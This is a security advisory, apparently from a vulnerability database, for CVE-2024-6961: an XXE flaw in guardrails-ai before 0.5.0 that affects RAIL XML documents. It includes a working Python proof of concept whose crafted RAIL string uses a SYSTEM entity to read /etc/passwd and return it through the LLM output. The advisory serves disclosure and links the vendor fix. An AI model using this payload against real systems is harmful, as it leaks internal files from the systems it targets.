---
description: CVE-2024-6961, MEDIUM, Guardrails RAIL XXE
title: Guardrails RAIL XXE
date_published: "2024-07-21"
last_updated: "2024-07-21"
xray_id: JFSA-2024-001035519
vul_id: CVE-2024-6961
cvss: 5.9
severity: medium
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

XXE in Guardrails AI when consuming RAIL documents

## Component

guardrails-ai

## Affected versions

(,0.5.0)

## Description

RAIL documents are an XML-based format invented by Guardrails AI to enforce formatting checks on LLM outputs. Guardrails users that consume RAIL documents from external sources are vulnerable to XXE, which may cause leakage of internal file data via the SYSTEM entity.



## PoC

```python
import anthropic
import guardrails as gd
from litellm import litellm
import os 

os.environ["ANTHROPIC_API_KEY"] = "put_here_your_secret_api_key"
API_KEY = os.environ["ANTHROPIC_API_KEY"]

## Assuming this RAIL document comes from an attacker
rail_str = """
<!--?xml version="0.1" ?-->
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<rail version="0.1">

<output type="string" >
</output>

<prompt>
just write back what appears down here:
&xxe;
</prompt>
</rail>
"""

## Call the vulnerable API
guard = gd.Guard.from_rail_string(rail_str)

llm_output_unfiltered, validated_output, *rest = guard(
  llm_api=litellm.completion,
  model="claude-3-opus-20240229"
)

## The validated_output will contain the contents of /etc/passwd
print(validated_output)

```



## Vulnerability Mitigations

No mitigations are supplied for this issue



## References

[Vendor fix](https://github.com/guardrails-ai/guardrails/pull/922)

